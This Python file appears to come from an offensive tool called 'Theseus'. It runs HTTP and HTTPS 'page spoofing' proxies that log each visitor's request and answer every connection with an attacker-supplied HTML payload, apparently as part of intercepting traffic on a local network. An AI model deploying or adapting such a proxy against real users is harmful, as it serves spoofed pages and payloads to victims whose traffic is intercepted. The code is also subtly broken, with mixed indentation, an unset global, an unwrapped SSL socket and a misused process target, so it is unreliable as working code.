#from OpenSSL import SSL
from __future__ import print_function
import socket
import multiprocessing
import ssl

class HTTP_Proxy(object):
	"""This is the http page spoofing proxy"""
	def __init__(self, bind_address, bind_port, html_file):
		global http_responce, s, html
		super(HTTP_Proxy, self).__init__()
		http_responce = "HTTP/1.1 200\r\nContent-Type: text/html\r\n{}\r\n"
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		#print("HTTP --> ", bind_address, bind_port)
		try:
			s.bind((bind_address, bind_port))
		except socket.error:
			print("\033[1;31mPort Alredy Open... Cant Bind\033[00m")
			exit()
		s.listen(5)
		with open(html_file, 'rb') as file:
			html = file.read()
			file.close()

	def _http_client_handler(self):
		while True:
			try:
				sock, addr = s.accept()
			except KeyboardInterrupt: exit()
			req = sock.recv(1024)
			try:
				data = req.decode('utf-8')
				with open('proxy.log', 'wb') as file:
					file.write(data)
					file.close()
				data = data.splitlines()
				if 'Accept:' not in data[1]:
					print(addr[0], "-->", data[1][6:], "-->" ,data[0])
				else:
					print(addr[0], "--> Unknown -->" ,data[0])
			except: pass
			sock.send(http_responce.format("\n"+html+" <script>window.stop();</script>"))
			if 'http://' in req:
				sock.send(http_responce.format("\n"+html+" <script>window.stop();</script>"))
				sock.close()
			elif '.css' in req:
				print("\n\n\n\n\n\n\nCSS!!!\n\n\n\n\n\n")
			sock.close()

class SSL_Proxy(object):
	"""This is the https page spoofing proxy"""
	def __init__(self, bind_address, bind_port, html_file):
		global ssl_socket, bs
		super(SSL_Proxy, self).__init__()
		context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
		context.load_cert_chain(certfile="/root/Documents/Theseus/src/proxy/certificates/theseus.crt", keyfile="/root/Documents/Theseus/src/proxy/certificates/theseus.key")
		bs = socket.socket()
		bs.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		#print("SSL -->", bind_address, bind_port)
		bs.bind((bind_address, bind_port))
		bs.listen(5)
		with open(html_file, 'rb') as file:
			html = file.read()
			file.close()

	def _ssl_client_handler(self):
		while True:
			try:
				sock, addr = bs.accept()
			except KeyboardInterrupt: exit()
			rec = sock.recv(1024)
			#print(rec)
			sock.send("200 OK\r\n")
			sock.send(http_responce.format("\n"+html+" <script>window.stop();</script>"))
			sock.close()


if __name__ == '__main__':
	http_proxy = HTTP_Proxy('192.168.1.115', 9000, 'Payloads/payload.html')
	ssl_proxy = SSL_Proxy('192.168.1.115', 4444, 'Payloads/payload.html')
	jobs = []
   	for i in range (4):
   		p = multiprocessing.Process(target=http_proxy._http_client_handler)
   		jobs.append(p)
   		p.start()
   		p2 = multiprocessing.Process(target=ssl_proxy._ssl_client_handler())
   		jobs.append(p2)
   		p2.start()